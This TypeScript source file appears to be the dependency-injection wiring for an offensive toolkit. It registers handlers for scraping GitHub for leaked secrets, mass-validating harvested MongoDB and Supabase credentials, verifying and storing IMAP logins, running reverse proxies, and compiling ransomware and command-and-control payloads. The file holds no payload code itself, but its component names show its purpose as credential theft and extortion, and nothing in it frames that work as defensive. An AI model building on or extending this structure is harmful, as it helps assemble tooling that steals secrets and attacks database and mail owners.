import { Container, TOKENS } from "../shared/Container.js";
import type { ICommandHandler } from "../domain/patterns/ICommandHandler.js";
import { MassiveValidationUseCase } from "./scraping/use-cases/MassiveValidationUseCase.js";
import { CompileRansomUseCase } from "./ransom/use-cases/CompileRansomUseCase.js";
import { CompileC2UseCase }     from "./c2/use-cases/CompileC2UseCase.js";
import { LoggingBehavior } from "./common/LoggingBehavior.js";
import { Mediator } from "./common/Mediator.js";
import { ValidationBehavior } from "./common/ValidationBehavior.js";


import { ValidateEmailHandler } from "./email/handlers/ValidateEmailHandler.js";
import { SendEmailHandler } from "./email/handlers/SendEmailHandler.js";
import { FetchInboxHandler } from "./email/handlers/FetchInboxHandler.js";
import { VerifyImapCredentialHandler } from "./email/handlers/VerifyImapCredentialHandler.js";
import { ReadCredentialsHandler } from "./email/handlers/ReadCredentialsHandler.js";
import { AppendCredentialHandler } from "./email/handlers/AppendCredentialHandler.js";
import { ImapStartListenHandler } from "./email/handlers/ImapStartListenHandler.js";
import { ImapStopListenHandler } from "./email/handlers/ImapStopListenHandler.js";
import { StartEmailMonitorHandler } from "./email/handlers/StartEmailMonitorHandler.js";
import { StopEmailMonitorHandler } from "./email/handlers/StopEmailMonitorHandler.js";
import { ValidateEmailCommandValidator } from "./email/validators/ValidateEmailCommandValidator.js";


import { ValidateMongoHandler } from "./mongo/handlers/ValidateMongoHandler.js";
import { ExecuteMongoValidationHandler } from "./mongo/handlers/ExecuteMongoValidationHandler.js";
import { ExecuteMongoMassiveHandler } from "./mongo/handlers/ExecuteMongoMassiveHandler.js";
import { ValidateMongoCommandValidator } from "./mongo/validators/ValidateMongoCommandValidator.js";


import { ValidateSupabaseHandler } from "./supabase/handlers/ValidateSupabaseHandler.js";
import { ExecuteSupabaseValidationHandler } from "./supabase/handlers/ExecuteSupabaseValidationHandler.js";
import { ExecuteSupabaseMassiveHandler } from "./supabase/handlers/ExecuteSupabaseMassiveHandler.js";
import { ValidateSupabaseCommandValidator } from "./supabase/validators/ValidateSupabaseCommandValidator.js";


import { StartAmbientProxyHandler } from "./proxy/handlers/StartAmbientProxyHandler.js";
import { StopAmbientProxyHandler } from "./proxy/handlers/StopAmbientProxyHandler.js";
import { RefreshProxyStatusHandler } from "./proxy/handlers/RefreshProxyStatusHandler.js";
import { StartReverseProxyHandler } from "./proxy/handlers/StartReverseProxyHandler.js";
import { StopReverseProxyHandler } from "./proxy/handlers/StopReverseProxyHandler.js";


import { ExecuteGitHubScrapingHandler } from "./scraping/handlers/ExecuteGitHubScrapingHandler.js";
import { ValidateGitHubBotHandler } from "./scraping/handlers/ValidateGitHubBotHandler.js";
import { ReadKeywordsHandler } from "./scraping/handlers/ReadKeywordsHandler.js";
import { ExecuteScrapValidatePipelineHandler } from "./scraping/handlers/ExecuteScrapValidatePipelineHandler.js";

export function addApplication(container: Container): void {

  container.register(TOKENS.LoggingBehavior, (c) =>
    new LoggingBehavior(c.resolve(TOKENS.ILogger)),
  );


  container.register(TOKENS.ValidateEmailHandler, (c) =>
    new ValidateEmailHandler(c.resolve(TOKENS.IEmailValidator)),
  );
  container.register(TOKENS.SendEmailHandler, (c) =>
    new SendEmailHandler(c.resolve(TOKENS.IEmailSender)),
  );
  container.register(TOKENS.FetchInboxHandler, (c) =>
    new FetchInboxHandler(c.resolve(TOKENS.IImapClient)),
  );
  container.register(TOKENS.VerifyImapCredentialHandler, (c) =>
    new VerifyImapCredentialHandler(c.resolve(TOKENS.IImapClient)),
  );
  container.register(TOKENS.ReadCredentialsHandler, (c) =>
    new ReadCredentialsHandler(c.resolve(TOKENS.IFileStorage)),
  );
  container.register(TOKENS.AppendCredentialHandler, (c) =>
    new AppendCredentialHandler(c.resolve(TOKENS.IFileStorage)),
  );
  container.register(TOKENS.ImapStartListenHandler, (c) =>
    new ImapStartListenHandler(c.resolve(TOKENS.ImapListenerFactory)),
  );
  container.register(TOKENS.ImapStopListenHandler, () =>
    new ImapStopListenHandler(),
  );
  container.register(TOKENS.StartEmailMonitorHandler, (c) =>
    new StartEmailMonitorHandler(c.resolve(TOKENS.EmailMonitorServiceFactory)),
  );
  container.register(TOKENS.StopEmailMonitorHandler, () =>
    new StopEmailMonitorHandler(),
  );


  container.register(TOKENS.ValidateMongoHandler, (c) =>
    new ValidateMongoHandler(c.resolve(TOKENS.IMongoValidator)),
  );
  container.register(TOKENS.ExecuteMongoValidationHandler, (c) =>
    new ExecuteMongoValidationHandler(
      () => c.resolve(TOKENS.IMediator),
      c.resolve(TOKENS.ICredentialEngineFactory),
      c.resolve(TOKENS.IFileStorage),
    ),
  );
  container.register(TOKENS.ExecuteMongoMassiveHandler, (c) =>
    new ExecuteMongoMassiveHandler(
      () => c.resolve(TOKENS.IMediator),
      c.resolve(TOKENS.MassiveValidationUseCase),
      c.resolve(TOKENS.IFileStorage),
    ),
  );


  container.register(TOKENS.ValidateSupabaseHandler, (c) =>
    new ValidateSupabaseHandler(c.resolve(TOKENS.ISupabaseValidator)),
  );
  container.register(TOKENS.ExecuteSupabaseValidationHandler, (c) =>
    new ExecuteSupabaseValidationHandler(
      () => c.resolve(TOKENS.IMediator),
      c.resolve(TOKENS.ICredentialEngineFactory),
      c.resolve(TOKENS.IFileStorage),
    ),
  );
  container.register(TOKENS.ExecuteSupabaseMassiveHandler, (c) =>
    new ExecuteSupabaseMassiveHandler(
      () => c.resolve(TOKENS.IMediator),
      c.resolve(TOKENS.MassiveValidationUseCase),
      c.resolve(TOKENS.IFileStorage),
    ),
  );


  container.register(TOKENS.StartAmbientProxyHandler, (c) =>
    new StartAmbientProxyHandler(c.resolve(TOKENS.IProxyManager)),
  );
  container.register(TOKENS.StopAmbientProxyHandler, (c) =>
    new StopAmbientProxyHandler(c.resolve(TOKENS.IProxyManager)),
  );
  container.register(TOKENS.RefreshProxyStatusHandler, (c) =>
    new RefreshProxyStatusHandler(c.resolve(TOKENS.IProxyManager)),
  );
  container.register(TOKENS.StartReverseProxyHandler, (c) =>
    new StartReverseProxyHandler(c.resolve(TOKENS.IReverseProxyModuleFactory)),
  );
  container.register(TOKENS.StopReverseProxyHandler, () =>
    new StopReverseProxyHandler(),
  );


  container.register(TOKENS.ExecuteGitHubScrapingHandler, (c) =>
    new ExecuteGitHubScrapingHandler(c.resolve(TOKENS.IGitHubScraper)),
  );
  container.register(TOKENS.ValidateGitHubBotHandler, (c) =>
    new ValidateGitHubBotHandler(c.resolve(TOKENS.IGitHubScraper)),
  );
  container.register(TOKENS.ReadKeywordsHandler, (c) =>
    new ReadKeywordsHandler(c.resolve(TOKENS.IKeywordReader)),
  );
  container.register(TOKENS.ExecuteScrapValidatePipelineHandler, (c) =>
    new ExecuteScrapValidatePipelineHandler(
      () => c.resolve(TOKENS.IMediator),
      c.resolve(TOKENS.MassiveValidationUseCase),
      c.resolve(TOKENS.IFileStorage),
    ),
  );


  container.register(TOKENS.IMediator, (c) => {
    const handlers = new Map<string, ICommandHandler<any, any>>();


    handlers.set("ValidateEmailCommand",       c.resolve(TOKENS.ValidateEmailHandler));
    handlers.set("SendEmailCommand",           c.resolve(TOKENS.SendEmailHandler));
    handlers.set("FetchInboxCommand",          c.resolve(TOKENS.FetchInboxHandler));
    handlers.set("VerifyImapCredentialCommand", c.resolve(TOKENS.VerifyImapCredentialHandler));
    handlers.set("ReadCredentialsCommand",     c.resolve(TOKENS.ReadCredentialsHandler));
    handlers.set("AppendCredentialCommand",    c.resolve(TOKENS.AppendCredentialHandler));
    handlers.set("ImapStartListenCommand",     c.resolve(TOKENS.ImapStartListenHandler));
    handlers.set("ImapStopListenCommand",      c.resolve(TOKENS.ImapStopListenHandler));
    handlers.set("StartEmailMonitorCommand",   c.resolve(TOKENS.StartEmailMonitorHandler));
    handlers.set("StopEmailMonitorCommand",    c.resolve(TOKENS.StopEmailMonitorHandler));


    handlers.set("ValidateMongoCommand",          c.resolve(TOKENS.ValidateMongoHandler));
    handlers.set("ExecuteMongoValidationCommand", c.resolve(TOKENS.ExecuteMongoValidationHandler));
    handlers.set("ExecuteMongoMassiveCommand",    c.resolve(TOKENS.ExecuteMongoMassiveHandler));


    handlers.set("ValidateSupabaseCommand",          c.resolve(TOKENS.ValidateSupabaseHandler));
    handlers.set("ExecuteSupabaseValidationCommand", c.resolve(TOKENS.ExecuteSupabaseValidationHandler));
    handlers.set("ExecuteSupabaseMassiveCommand",    c.resolve(TOKENS.ExecuteSupabaseMassiveHandler));


    handlers.set("StartAmbientProxyCommand",   c.resolve(TOKENS.StartAmbientProxyHandler));
    handlers.set("StopAmbientProxyCommand",    c.resolve(TOKENS.StopAmbientProxyHandler));
    handlers.set("RefreshProxyStatusCommand",  c.resolve(TOKENS.RefreshProxyStatusHandler));
    handlers.set("StartReverseProxyCommand",   c.resolve(TOKENS.StartReverseProxyHandler));
    handlers.set("StopReverseProxyCommand",    c.resolve(TOKENS.StopReverseProxyHandler));


    handlers.set("ExecuteGitHubScrapingCommand",        c.resolve(TOKENS.ExecuteGitHubScrapingHandler));
    handlers.set("ValidateGitHubBotCommand",            c.resolve(TOKENS.ValidateGitHubBotHandler));
    handlers.set("ReadKeywordsCommand",                 c.resolve(TOKENS.ReadKeywordsHandler));
    handlers.set("ExecuteScrapValidatePipelineCommand", c.resolve(TOKENS.ExecuteScrapValidatePipelineHandler));

    const validators = new Map<string, ValidationBehavior<any>>();
    validators.set("ValidateEmailCommand", new ValidationBehavior([new ValidateEmailCommandValidator()]));
    validators.set("ValidateMongoCommand", new ValidationBehavior([new ValidateMongoCommandValidator()]));
    validators.set("ValidateSupabaseCommand", new ValidationBehavior([new ValidateSupabaseCommandValidator()]));

    return new Mediator(handlers, c.resolve(TOKENS.LoggingBehavior), validators);
  });


  container.register(TOKENS.MassiveValidationUseCase, (c) =>
    new MassiveValidationUseCase(
      c.resolve(TOKENS.IGitHubScraper),
      c.resolve(TOKENS.ICredentialEngineFactory),
    ),
  );


  container.register(TOKENS.CompileRansomUseCase, (c) =>
    new CompileRansomUseCase(c.resolve(TOKENS.IRansomCompiler)),
  );


  container.register(TOKENS.CompileC2UseCase, (c) =>
    new CompileC2UseCase(c.resolve(TOKENS.IC2Compiler)),
  );
}

